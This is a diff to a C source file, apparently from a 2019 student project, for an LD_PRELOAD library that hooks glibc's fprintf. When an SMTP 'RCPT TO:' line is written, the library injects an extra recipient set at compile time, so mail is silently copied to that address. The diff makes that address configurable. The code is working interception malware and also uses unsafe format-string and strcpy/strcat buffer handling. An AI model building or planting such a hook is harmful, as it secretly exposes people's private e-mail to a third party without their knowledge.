@@ -1,3 +1,13 @@
+/*
+* Authors : Bastien Wermeille & Malik Fleury
+* Date : 08.04.2019
+*/
+
+#ifndef CC
+#error "CC macro is not passed, please use the following command : \
+        gcc -fPIC -shared -o libpreload.so ./preload.c -ldl -DCC=\"malik.fleury@he-arc.ch\""
+
+#else
 #define _GNU_SOURCE
 #include <dlfcn.h>
 #include <stdio.h>
@@ -6,6 +16,13 @@
 
 /* Function pointers to hold the value of the glibc functions */
 static int (*real_fprintf)(FILE *stream, const char *format, ...) = NULL;
+
+void createCC(char* cc)
+{
+  strcpy(cc,"RCPT TO: ");
+  strcat(cc, CC);
+  strcat(cc, "\n");
+}
 
 int fprintf(FILE *stream, const char *format, ...)
 {
@@ -18,13 +35,16 @@ int fprintf(FILE *stream, const char *format, ...)
     va_end(args);
 
     real_fprintf = dlsym(RTLD_NEXT, "fprintf");
-    
+
     char RECEPT_TO[] = "RCPT TO:";
     char *result = strstr(buffer, RECEPT_TO);
 
     if (result != NULL)
     {
-        real_fprintf(stream, "RCPT TO: malik.fleury@he-arc.ch\n");
+        char cc[255];
+        createCC(cc);
+
+        real_fprintf(stream, cc);
         fflush(stream);
 
         char receipt[255];
@@ -37,3 +57,5 @@ int fprintf(FILE *stream, const char *format, ...)
 
     return real_fprintf(stream, format);
 }
+
+#endif
